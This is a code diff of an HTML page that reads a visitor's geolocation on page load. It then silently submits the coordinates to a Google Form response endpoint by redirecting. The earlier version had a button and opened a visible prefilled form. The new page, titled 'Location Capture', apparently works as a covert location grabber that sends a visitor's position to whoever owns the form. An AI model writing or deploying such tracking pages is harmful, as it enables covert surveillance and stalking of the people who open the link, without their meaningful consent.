@@ -1,44 +1,32 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Access Form</title>
+  <title>Location Capture</title>
 </head>
+<body>
 
-<body style="text-align:center; font-family:Arial; margin-top:100px;">
+<h2>Please wait... capturing your location</h2>
 
-  <h2>Please enable location to continue</h2>
-  <button onclick="getLocation()" style="padding:10px 20px; font-size:16px;">
-    Continue
-  </button>
+<script>
+navigator.geolocation.getCurrentPosition(function(position) {
+    var lat = position.coords.latitude;
+    var lon = position.coords.longitude;
 
-  <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          function(position) {
+    var location = lat + "," + lon;
 
-            var lat = position.coords.latitude;
-            var lon = position.coords.longitude;
+    var formURL = "https://docs.google.com/forms/d/e/1FAIpQLScLmz29sgA7T8nwE8xSRq4Wt_DkhDtSOQuvJ-rC9WZxEyhyLA/formResponse";
+    
+    var entryID = "entry.1359051256";
 
-            // Encode location properly
-            var locationText = encodeURIComponent(lat + "," + lon);
+    var submitURL = formURL + "?" + entryID + "=" + encodeURIComponent(location);
 
-            // Your Google Form link with correct entry ID
-            var formURL = "https://docs.google.com/forms/d/e/1FAIpQLSfZeKI8gZBe-sOaY7wexY3aLM0HgRk42QovqjrJcM1othsTYg/viewform?usp=pp_url&entry.1359051256=" + locationText;
+    // Redirect to submit automatically
+    window.location.href = submitURL;
 
-            // Redirect to form
-            window.location.href = formURL;
-          },
-
-          function(error) {
-            alert("Location is required to proceed.");
-          }
-        );
-      } else {
-        alert("Geolocation not supported.");
-      }
-    }
-  </script>
+}, function(error) {
+    alert("Location permission denied. Please allow location access.");
+});
+</script>
 
 </body>
 </html>
